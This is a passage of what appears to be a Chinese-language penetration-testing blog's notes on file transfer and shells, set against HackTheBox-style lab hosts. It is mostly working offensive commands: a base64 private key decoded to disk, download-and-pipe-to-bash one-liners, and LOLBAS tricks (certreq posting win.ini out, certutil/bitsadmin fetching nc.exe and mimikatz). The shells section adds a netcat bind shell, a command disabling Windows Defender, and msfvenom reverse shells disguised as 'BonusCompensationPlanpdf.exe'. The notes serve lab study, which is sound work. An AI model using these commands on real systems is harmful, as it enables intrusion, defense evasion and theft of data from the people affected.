class="line">IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-FileHash</span> <span class="string">&quot;C:\Windows\system32\drivers\etc\hosts&quot;</span> <span class="literal">-Algorithm</span> MD5 | <span class="built_in">select</span> Hash</span><br><span class="line"></span><br><span class="line">Hash</span><br><span class="line"><span class="literal">----</span></span><br><span class="line"><span class="number">3688374325</span>B992DEF12793500307566D</span><br></pre></td></tr></table></figure><p>decode</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; [<span class="type">IO.File</span>]::WriteAllBytes(<span class="string">&quot;C:\Users\Public\id_rsa&quot;</span>, [<span class="type">Convert</span>]::FromBase64String(<span class="string">&quot;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-FileHash</span> C:\Users\Public\id_rsa <span class="literal">-Algorithm</span> md5</span><br><span class="line"></span><br><span class="line">Algorithm       Hash                                     Path</span><br><span class="line"><span class="literal">---------</span>       <span class="literal">----</span>                                     <span class="literal">----</span></span><br><span class="line">MD5             <span class="number">4</span>E301756A07DED0A2DD6953ABF015278         C:\Users\Public\id_rsa</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：虽然这种方法很方便，但并不总是可行的。Windows 命令行实用程序 (cmd.exe) 的最大字符串长度为 8,191 个字符。此外，如果您尝试发送非常大的字符串，Web shell 可能会出错</span></span><br></pre></td></tr></table></figure><h1 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h1><h2 id="Impacket-smbserver"><a href="#Impacket-smbserver" class="headerlink" title="Impacket smbserver"></a>Impacket smbserver</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-smbserver share -smb2support /tmp/smbshare</span><br><span class="line"># or</span><br><span class="line">sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test</span><br></pre></td></tr></table></figure><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">copy</span> \\192.168.220.133\<span class="title">share</span>\<span class="title">nc.exe</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">net</span> <span class="title">use</span> <span class="title">n</span>: \\192.168.220.133\<span class="title">share</span> /<span class="title">user:test</span> <span class="title">test</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">copy</span> <span class="title">n</span>:\<span class="title">nc.exe</span></span></span><br><span class="line"><span class="function">        1 <span class="title">file</span>(<span class="title">s</span>) <span class="title">copied</span>.</span></span><br></pre></td></tr></table></figure><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient \\\\192.168.220.133\\share -U test%test</span><br><span class="line"></span><br><span class="line">smb: \&gt; recurse ON# 启用递归模式</span><br><span class="line">smb: \&gt; prompt OFF# 关闭下载提示</span><br><span class="line">smb: \&gt; mget *</span><br></pre></td></tr></table></figure><h1 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h1><h2 id="Python3-pyftpdlib"><a href="#Python3-pyftpdlib" class="headerlink" title="Python3 pyftpdlib"></a>Python3 pyftpdlib</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pyftpdlib --port 21</span><br></pre></td></tr></table></figure><h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; (<span class="built_in">New-Object</span> Net.WebClient).DownloadFile(<span class="string">&#x27;ftp://192.168.49.128/file.txt&#x27;</span>, <span class="string">&#x27;C:\Users\Public\ftp-file.txt&#x27;</span>)</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">C:\&gt; ftp anonymous@ftp<span class="literal">-server</span></span><br></pre></td></tr></table></figure><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp anonymous@ftp-server</span><br></pre></td></tr></table></figure><h1 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h1><h2 id="mount-linux-folder"><a href="#mount-linux-folder" class="headerlink" title="mount linux folder"></a>mount linux folder</h2><h3 id="rdesktop"><a href="#rdesktop" class="headerlink" title="rdesktop"></a>rdesktop</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 10.10.10.132 -d HTB -u administrator -p &#x27;Password0@&#x27; -r disk:linux=&#x27;/home/user/rdesktop/files&#x27;</span><br></pre></td></tr></table></figure><h3 id="xfreerdp"><a href="#xfreerdp" class="headerlink" title="xfreerdp"></a>xfreerdp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:&#x27;Password0@&#x27; /drive:linux,/home/plaintext/htb/academy/filetransfer</span><br></pre></td></tr></table></figure><h3 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\client\</span><br></pre></td></tr></table></figure><h2 id="mount-windows-folder"><a href="#mount-windows-folder" class="headerlink" title="mount windows folder"></a>mount windows folder</h2><p>Windows 的<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc">mstsc.exe</a>远程桌面客户端</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1729603855319.png" alt="rdp"></p><h1 id="Language"><a href="#Language" class="headerlink" title="Language"></a>Language</h1><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2.7 -c &#x27;import urllib;urllib.urlretrieve (&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">python3 -c &#x27;import urllib.request;urllib.request.urlretrieve(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;)&#x27;</span><br></pre></td></tr></table></figure><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$file = file_get_contents(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;); file_put_contents(&quot;LinEnum.sh&quot;,$file);&#x27;</span><br><span class="line"></span><br><span class="line">php -r &#x27;const BUFFER = 1024; $fremote = </span><br><span class="line">fopen(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;rb&quot;); $flocal = fopen(&quot;LinEnum.sh&quot;, &quot;wb&quot;); while ($buffer = fread($fremote, BUFFER)) &#123; fwrite($flocal, $buffer); &#125; fclose($flocal); fclose($fremote);&#x27;</span><br><span class="line"></span><br><span class="line">php -r &#x27;$lines = @file(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;); foreach ($lines as $line_num =&gt; $line) &#123; echo $line; &#125;&#x27; | bash</span><br></pre></td></tr></table></figure><h2 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -e &#x27;require &quot;net/http&quot;; File.write(&quot;LinEnum.sh&quot;, Net::HTTP.get(URI.parse(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;)))&#x27;</span><br></pre></td></tr></table></figure><h2 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use LWP::Simple; getstore(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;);&#x27;</span><br></pre></td></tr></table></figure><h1 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc 10.10.10.10 9001 &lt; file.exe</span><br><span class="line">nc -lp 8000 &gt; file.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重定向符可颠倒</span></span><br></pre></td></tr></table></figure><h1 id="Encrypted-transmission"><a href="#Encrypted-transmission" class="headerlink" title="Encrypted transmission"></a>Encrypted transmission</h1><h2 id="Invoke-AESEncryption-ps1"><a href="#Invoke-AESEncryption-ps1" class="headerlink" title="Invoke-AESEncryption.ps1"></a>Invoke-AESEncryption.ps1</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-AESEncryption</span>.ps1</span><br></pre></td></tr></table></figure><p>加密</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Invoke-AESEncryption</span> <span class="literal">-Mode</span> Encrypt <span class="literal">-Key</span> <span class="string">&quot;p4ssw0rd&quot;</span> <span class="literal">-Path</span> .\scan<span class="literal">-results</span>.txt</span><br><span class="line"></span><br><span class="line">File encrypted to C:\\scan<span class="literal">-results</span>.txt.aes</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"><span class="literal">-a----</span>        <span class="number">11</span>/<span class="number">18</span>/<span class="number">2020</span>  <span class="number">12</span>:<span class="number">17</span> AM           <span class="number">9734</span> <span class="built_in">Invoke-AESEncryption</span>.ps1</span><br><span class="line"><span class="literal">-a----</span>        <span class="number">11</span>/<span class="number">18</span>/<span class="number">2020</span>  <span class="number">12</span>:<span class="number">19</span> PM           <span class="number">1724</span> scan<span class="literal">-results</span>.txt</span><br><span class="line"><span class="literal">-a----</span>        <span class="number">11</span>/<span class="number">18</span>/<span class="number">2020</span>  <span class="number">12</span>:<span class="number">20</span> PM           <span class="number">3448</span> scan<span class="literal">-results</span>.txt.aes</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>解密</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Invoke-AESEncryption</span> <span class="literal">-Mode</span> Decrypt <span class="literal">-Key</span> <span class="string">&quot;p4ssw0rd&quot;</span> <span class="literal">-Path</span> .\scan<span class="literal">-results</span>.aes</span><br></pre></td></tr></table></figure><h2 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h2><p>加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc</span><br><span class="line"></span><br><span class="line">enter aes-256-cbc encryption password:                                                         </span><br><span class="line">Verifying - enter aes-256-cbc encryption password:                              </span><br></pre></td></tr></table></figure><p>解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    </span><br><span class="line"></span><br><span class="line">enter aes-256-cbc decryption password:</span><br></pre></td></tr></table></figure><h1 id="Living-off-The-Land"><a href="#Living-off-The-Land" class="headerlink" title="Living off The Land"></a>Living off The Land</h1><p><a href="https://lolbas-project.github.io/#">LOLBAS for Windows</a>和<a href="https://gtfobins.github.io/">GTFOBins for Linux</a>，是可以搜索用于不同功能的二进制文件的网站。</p><h2 id="LOLBAS"><a href="#LOLBAS" class="headerlink" title="LOLBAS"></a>LOLBAS</h2><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1729649886592.jpg" alt="lolbas_upload"></p><h3 id="certreq-exe"><a href="#certreq-exe" class="headerlink" title="certreq.exe"></a>certreq.exe</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">certreq.exe</span> -<span class="title">Post</span> -<span class="title">config</span> <span class="title">http</span>://192.168.49.128:8000/ <span class="title">c</span>:\<span class="title">windows</span>\<span class="title">win.ini</span></span></span><br><span class="line"><span class="function"><span class="title">Certificate</span> <span class="title">Request</span> <span class="title">Processor</span>: <span class="title">The</span> <span class="title">operation</span> <span class="title">timed</span> <span class="title">out</span> 0<span class="title">x80072ee2</span> (<span class="title">WinHttp</span>: 12002 <span class="title">ERROR_WINHTTP_TIMEOUT</span>)</span></span><br></pre></td></tr></table></figure><p>necat 接收</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nc -lvnp 8000</span><br><span class="line"></span><br><span class="line">listening on [any] 8000 ...</span><br><span class="line">connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819</span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Content-Type: application/json</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)</span><br><span class="line">Content-Length: 92</span><br><span class="line">Host: 192.168.49.128:8000</span><br><span class="line"></span><br><span class="line">; for 16-bit app support</span><br><span class="line">[fonts]</span><br><span class="line">[extensions]</span><br><span class="line">[mci extensions]</span><br><span class="line">[files]</span><br><span class="line">[Mail]</span><br><span class="line">MAPI=1</span><br></pre></td></tr></table></figure><h3 id="Bitsadmin"><a href="#Bitsadmin" class="headerlink" title="Bitsadmin"></a>Bitsadmin</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; bitsadmin /transfer wcb /priority foreground http://<span class="number">10.10</span>.<span class="number">15.66</span>:<span class="number">8000</span>/nc.exe C:\Users\<span class="literal">-student</span>\Desktop\nc.exe</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> bitstransfer; <span class="built_in">Start-BitsTransfer</span> <span class="literal">-Source</span> <span class="string">&quot;http://10.10.10.32:8000/nc.exe&quot;</span> <span class="literal">-Destination</span> <span class="string">&quot;C:\Windows\Temp\nc.exe&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">certutil.exe</span> -<span class="title">verifyctl</span> -<span class="title">split</span> -<span class="title">f</span> <span class="title">http</span>://10.10.10.32:8000/<span class="title">nc.exe</span></span></span><br></pre></td></tr></table></figure><h3 id="GfxDownloadWrapper-exe"><a href="#GfxDownloadWrapper-exe" class="headerlink" title="GfxDownloadWrapper.exe"></a>GfxDownloadWrapper.exe</h3><p>Windows 10 的英特尔显卡驱动程序</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; GfxDownloadWrapper.exe <span class="string">&quot;http://10.10.10.132/mimikatz.exe&quot;</span> <span class="string">&quot;C:\Temp\nc.exe&quot;</span></span><br></pre></td></tr></table></figure><h2 id="GTFOBins"><a href="#GTFOBins" class="headerlink" title="GTFOBins"></a>GTFOBins</h2><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-1729646319842.jpg" alt="gtfobins_download"></p><h3 id="openssl-1"><a href="#openssl-1" class="headerlink" title="openssl"></a>openssl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem</span><br><span class="line"></span><br><span class="line">Generating a RSA private key</span><br><span class="line">.......................................................................................................+++++</span><br><span class="line">................+++++</span><br><span class="line">writing new private key to &#x27;key.pem&#x27;</span><br><span class="line">-----</span><br><span class="line">You are about to be asked to enter information that will be incorporated</span><br><span class="line">into your certificate request.</span><br><span class="line">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class="line">There are quite a few fields but you can leave some blank</span><br><span class="line">For some fields there will be a default value,</span><br><span class="line">If you enter &#x27;.&#x27;, the field will be left blank.</span><br><span class="line">-----</span><br><span class="line">Country Name (2 letter code) [AU]:</span><br><span class="line">State or Province Name (full name) [Some-State]:</span><br><span class="line">Locality Name (eg, city) []:</span><br><span class="line">Organization Name (eg, company) [Internet Widgits Pty Ltd]:</span><br><span class="line">Organizational Unit Name (eg, section) []:</span><br><span class="line">Common Name (e.g. server FQDN or YOUR name) []:</span><br><span class="line">Email Address []:</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem &lt; /tmp/LinEnum.sh</span><br></pre></td></tr></table></figure><p>在 taeget 下载文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_client -connect 10.10.10.32:80 -quiet &gt; LinEnum.sh</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lateral-Movement </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shells</title>
      <link href="/2024/09/30/pentest/lateral/Shells/"/>
      <url>/2024/09/30/pentest/lateral/Shells/</url>
      
        <content type="html"><![CDATA[<h1 id="Bind-Shells"><a href="#Bind-Shells" class="headerlink" title="Bind Shells"></a>Bind Shells</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc -l 10.129.41.200 7777 &gt; /tmp/f</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 10.129.41.200 7777</span><br><span class="line">Target@server:~$  </span><br></pre></td></tr></table></figure><h1 id="Reverse-Shells"><a href="#Reverse-Shells" class="headerlink" title="Reverse Shells"></a>Reverse Shells</h1><p>禁用 <code>Windows Defender antivirus</code>(<code>AV</code>) 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Set-MpPreference -DisableRealtimeMonitoring $true</span><br></pre></td></tr></table></figure><p>msfvenom</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf &gt; createbackup.elf</span><br><span class="line"># or</span><br><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe &gt; BonusCompensationPlanpdf.exe</span><br><span class="line">...</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 443</span><br></pre></td></tr></table></figure><p>Online - Reverse Shell Generator <a href="https://www.revshells.com/">https://www.revshells.com/</a></p><h1 id="TTY-Shell"><a href="#TTY-Shell" class="headerlink" title="TTY Shell"></a>TTY Shell</h1><p>当进入系统 shell 时，注意到没有提示符，但仍然可以发出一些系统命令。这种 shell 通常称为<code>non-tty shell</code>。这些 shell 的功能有限，通常会阻止使用<code>su</code>（<code>switch user</code>）和<code>sudo</code>（<code>super user do</code>）等基本命令，而如果试图提升权限，很可能会需要这些命令。发生这种情况是因为有效载荷是由 apache 用户在目标上执行的。会话是以 apache 用户的身份建立的。通常，管理员不会以 apache 用户的身份访问系统，因此无需在与 apache 关联的环境变量中定义 shell 解释器语言。</p><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27; </span><br><span class="line"></span><br><span class="line">sh-4.2$         </span><br><span class="line">sh-4.2$ whoami</span><br><span class="line">whoami</span><br><span class="line">apache</span><br></pre></td></tr></table></figure><h2 id="bin-sh-i"><a href="#bin-sh-i" class="headerlink" title="&#x2F;bin&#x2F;sh -i"></a>&#x2F;bin&#x2F;sh -i</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh -i</span><br><span class="line">sh: no job control in this shell</span><br><span 